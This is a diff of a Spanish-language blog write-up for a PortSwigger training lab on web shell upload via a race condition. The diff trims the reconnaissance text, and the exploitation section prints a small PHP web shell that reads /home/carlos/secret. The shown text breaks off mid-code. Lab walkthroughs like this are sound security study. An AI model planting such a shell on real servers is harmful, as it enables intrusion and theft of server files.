@@ -147,27 +147,7 @@ if (!doNotTrack) {
     <h1 id="lab-web-shell-upload-via-race-condition">Lab: Web shell upload via race condition</h1>
 <p>En este <!-- raw HTML omitted -->laboratorio<sup id="fnref:1"><a href="#fn:1" class="footnote-ref" role="doc-noteref">1</a></sup><!-- raw HTML omitted -->la finalidad es subir una shell al servidor para luego poder extraer o recuperar informacion de este. En este caso tenemos que leer el archivo <code>/home/carlos/secret</code></p>
 <h2 id="reconocimiento">Reconocimiento</h2>
-<p>Cuando ingresamos con la cuenta de <code>wiener:peter</code> tenemos una opcion para subir archivos, en este caso el avatar del usuario, pero al intentar subir una imagen no nos da una opcion para poder elegir imagen u otro.</p>
-<p><figure 
-	
-		class="gallery-image" 
-		style="
-			flex-grow: 142; 
-			flex-basis: 340px"
-	>
-	<a href="/p/portswigger-academy-learning-path-file-upload-lab-8/upload.png" data-size="1200x845">
-		<img src="/p/portswigger-academy-learning-path-file-upload-lab-8/upload.png"
-			width="1200"
-			height="845"
-			srcset="/p/portswigger-academy-learning-path-file-upload-lab-8/upload_hubfff896f02667d728ec037f96a306033_47826_480x0_resize_box_3.png 480w, /p/portswigger-academy-learning-path-file-upload-lab-8/upload_hubfff896f02667d728ec037f96a306033_47826_1024x0_resize_box_3.png 1024w"
-			loading="lazy"
-			alt="Sistema permite la subida de archivos">
-	</a>
-	
-	<figcaption>Sistema permite la subida de archivos</figcaption>
-	
-</figure></p>
-<p>Todo bien pero el sistema parece que no ejecuta el codigo php desde la carpeta, haciendo que cualquier archivo php solo podamos ver el contenido del <code>php</code> como si fuera texto plano.</p>
+<p>Cuando ingresamos con la cuenta de <code>wiener:peter</code> tenemos una opcion para subir archivos, en este caso el avatar del usuario.</p>
 <h2 id="explotacion">Explotacion</h2>
 <p>Creamos el archivo php con el siguiente codigo</p>
 <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="o">&lt;?</span><span class="nx">php</span> <span class="k">echo</span> <span class="nx">file_get_contents</span><span class="p">(</span><span class="s1">&#39;/home/carlos/secret&#39;</span><span class="p">);</span> <span class="cp">?&gt;</span><span class="err">
